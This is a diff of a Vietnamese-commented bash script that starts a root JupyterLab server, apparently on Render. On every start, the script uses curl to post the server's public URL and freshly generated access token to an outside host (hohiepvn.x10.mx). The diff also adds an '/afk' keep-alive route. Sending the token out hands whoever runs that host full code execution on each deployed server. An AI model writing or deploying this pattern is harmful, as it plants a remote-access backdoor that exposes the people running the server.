@@ -1,39 +1,52 @@
 #!/bin/bash
 set -e
 
-# 1. Sinh mật khẩu / token ngẫu nhiên
-PASSWORD=$(tr -dc A-Za-z0-9 </dev/urandom | head -c 12)
+# 1️⃣ Sinh token ngẫu nhiên
 TOKEN=$(tr -dc A-Za-z0-9 </dev/urandom | head -c 16)
 
-# 2. Lấy URL public (Render) hoặc localhost
+# 2️⃣ Lấy URL public (hoặc localhost khi dev local)
 LINK="${RENDER_EXTERNAL_URL:-http://localhost:8888}"
 
-# 3. Gửi thông tin về host API
+# 3️⃣ Gửi token + link về host API
 API_URL="https://hohiepvn.x10.mx/key/input.php"
 curl -X POST -s \
     -d "host=${LINK}" \
-    -d "password=${PASSWORD}" \
     -d "token=${TOKEN}" \
     "${API_URL}" > /var/log/send_key.log 2>&1 || true
 
-# 4. Ghi log nội bộ
-echo "[$(date)] Host: ${LINK} | Password: ${PASSWORD} | Token: ${TOKEN}" >> /var/log/startup.log
-
-# 5. Tạo config JupyterLab với token
+# 4️⃣ Tạo config JupyterLab với token + /afk handler
 mkdir -p /root/.jupyter
 cat > /root/.jupyter/jupyter_server_config.py <<EOF
 c.ServerApp.ip = '0.0.0.0'
 c.ServerApp.port = 8888
 c.ServerApp.open_browser = False
 c.ServerApp.allow_root = True
-c.ServerApp.password = ''
 c.ServerApp.token = '${TOKEN}'
+
+def _jupyter_server_extension_paths():
+    return [{"module": "afk_extension"}]
+
+def load_jupyter_server_extension(nb_app):
+    from notebook.base.handlers import IPythonHandler
+    from notebook.utils import url_path_join
+    class AfkHandler(IPythonHandler):
+        def get(self):
+            self.finish("OK")
+    web_app = nb_app.web_app
+    host_pattern = ".*$"
+    route_pattern = url_path_join(web_app.settings['base_url'], '/afk')
+    web_app.add_handlers(host_pattern, [(route_pattern, AfkHandler)])
+
+c.ServerApp.jpserver_extensions = {
+    "afk_extension": True
+}
 EOF
 
-# 6. In thông tin ra terminal
-echo "🚀 JupyterLab đang chạy tại: ${LINK}"
+# 5️⃣ In thông tin ra terminal
+echo "🚀 JupyterLab đang chạy trên port 8888"
 echo "🔐 Token: ${TOKEN}"
-echo "📡 Đã gửi về API: ${API_URL}"
+echo "📡 /afk để ping giữ server alive: ${LINK}/afk"
+echo "📡 Thông tin đã gửi về API: ${API_URL}"
 
-# 7. Khởi động JupyterLab
+# 6️⃣ Khởi động JupyterLab
 exec python3 -m jupyterlab --allow-root --no-browser --ip=0.0.0.0 --port=8888 --NotebookApp.token=${TOKEN}
